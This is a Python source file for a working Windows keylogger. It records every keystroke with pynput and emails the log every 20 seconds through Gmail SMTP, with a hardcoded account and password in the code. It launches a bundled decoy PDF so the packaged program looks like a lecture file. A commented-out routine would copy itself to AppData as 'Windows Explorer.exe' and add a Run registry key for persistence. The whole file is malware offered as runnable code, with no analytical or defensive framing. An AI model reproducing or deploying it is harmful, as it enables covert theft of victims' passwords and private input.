import subprocess
import sys
import pynput.keyboard
import threading
import smtplib
import os
import shutil


def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if (key == key.space):
            log = log + " "
        else:
            log = log + str(key)

def report():
    global log
    send_email("konzsubber@gmail.com", "kdugeohqmtrkufeq", log)
    log=""
    timer = threading.Timer(20, report)
    timer.start()

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# def auto_start():
#     evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
#     if not (os.path.exists(evil_file_location)):
#         shutil.copyfile(sys.executable, evil_file_location)
#         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)


log ="Start logging keyboard"
#auto_start()
file_name = sys._MEIPASS + "\lec09.pdf"
subprocess.Popen(file_name, shell=True)
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()